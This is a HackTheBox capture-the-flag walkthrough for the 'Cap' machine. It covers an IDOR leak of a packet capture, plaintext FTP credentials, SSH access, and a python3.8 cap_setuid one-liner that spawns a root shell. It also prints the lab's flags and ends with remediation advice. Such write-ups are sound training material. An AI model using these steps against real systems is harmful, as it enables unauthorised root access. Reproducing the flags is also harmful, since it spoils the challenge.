# Target: Cap
**Platform:** HackTheBox
[Cap on HackTheBox](https://app.hackthebox.com/machines/Cap)

| Target Name | IP Address | OS | Difficulty |
| :--- | :--- | :--- | :--- |
| Cap | 10.10.10.245 | Linux | Easy |

---

## Phase 1: Reconnaissance & Enumeration

I started my reconaissance by running the Nmap tool to find open TCP ports on the machine.\
**Nmap Scan:**
```bash
nmap 10.10.10.245
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-27 15:47 CET
Nmap scan report for 10.10.10.245
Host is up (0.032s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

The port 80 was open, including this machine host a web page. I entered the IP address in the browser and there I found the machine's page. At the main page there were security logs.
When I was exploring this website, I noticed, that if I moved to the `Security Snapshot` page, the URL of the page changed to the plain text:
```
10.10.10.245/data/[id].
```

I switched the id in the URL to 0, and the page showed me scans from another user. I downloaded this packet scan using buttn built into the site, to analyze it.
After downloading and opening the file, the Wireshark opened with already loaded network communication.
While exploring the file, I noticed that FTP communication wasn't encrypted and was shown in the plain text. I immediately opened them to check what information thye contained.
```
Frame 36: 69 bytes on wire (552 bits), 69 bytes captured (552 bits)
Linux cooked capture v1
Internet Protocol Version 4, Src: 192.168.196.1, Dst: 192.168.196.16
Transmission Control Protocol, Src Port: 54411, Dst Port: 21, Seq: 1, Ack: 21, Len: 13
File Transfer Protocol (FTP)
    	USER nathan\r\n
        	Request command: USER
        	Request arg: nathan
[Current working directory: ]
		
Frame 40: 78 bytes on wire (624 bits), 78 bytes captured (624 bits)
Linux cooked capture v1ac
Internet Protocol Version 4, Src: 192.168.196.1, Dst: 192.168.196.16
Transmission Control Protocol, Src Port: 54411, Dst Port: 21, Seq: 14, Ack: 55, Len: 22
File Transfer Protocol (FTP)
    	PASS Buck3tH4TF0RM3!\r\n
        	Request command: PASS
        	Request arg: Buck3tH4TF0RM3!
[Current working directory: ]
```

There I found the username and password to connect the machine.

## Phase 2: Initial Foothold (Gaining Access)

I connected with the machine using `SSH` connection.
**Connecting with the Machine:**
```bash
ssh nathan@10.10.10.245
```

I entered the password and the connection was succesful.
## Phase 3: Privilege Escalation & Post-Exploitation

After gaining access to the machine I searched for the files.
**Local Enumeration:**
```bash
nathan@cap:~$ ls
```

This showed me the list of the files and directories in current directory. I decided to read the user.txt file, to find the flag.
**Reading the File containing flag:**
```bash
nathan@cap:~$ cat user.txt
```

```
d3fec82c14e274e7db9f67333fdaa936
```

Next, I wanted to escalate my privileges, so I searched for the files that I can run with the root privileges.
**Finding Files to Escalate Privileges:**
```bash
getcap -r / | grep cap_setuid
```

So this showed me the list of files containing special capabilities. I used the `python3.8` binary to execute a command that escalate my privileges and spawns a root shell.
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

This allows me to use this machine as root. So I read the flag from 'root.txt' file.
**Reading the File containing root flag:**
```bash
cat root.txt
```

```
e09feb369c00947db8a95eaa218c3253
```
## Conclusion & Takeaways

**Summary:** The Cap machine required enumerating an open HTTP server, where an IDOR (Insecure Direct Object Reference) vulnerability exposed another user's network capture file. Analyzing this unencrypted FTP traffic in Wireshark revealed plain-text credentials for the user `nathan`. After gaining SSH access, privilege escalation was achieved by identifying the `cap_setuid` capability on the `python3.8` binary, allowing the execution of a one-liner script to spawn a root shell.

**What I Learned:** 
*  **Web Enumeration:** How to identify and exploit IDOR vulnerabilities by manipulating URL parameters.
*  **Traffic Analysis:** The importance of analyzing network packet captures (PCAPs) to uncover sensitive, unencrypted data.
*  **Linux Privilege Escalation:** How to hunt for and leverage misconfigured Linux file capabilities (specifically `cap_setuid`) to gain root access.

To secure this server and prevent similar attacks, I recommend the following remediations:

1. **Implement Access Controls:** Ensure that users cannot access other users' data simply by changing the `ID` number in the URL (this fixes the `IDOR` vulnerability).
2. **Encrypt Nerwork Traffic:** Replace standard `FTP` with `SFTP` or `FTPS` to ensure credentials and files ale not sent over the network in plain text.
3. **secure Credential Storage:** Avoid leaving plain text passwords in network capture files or scritps.
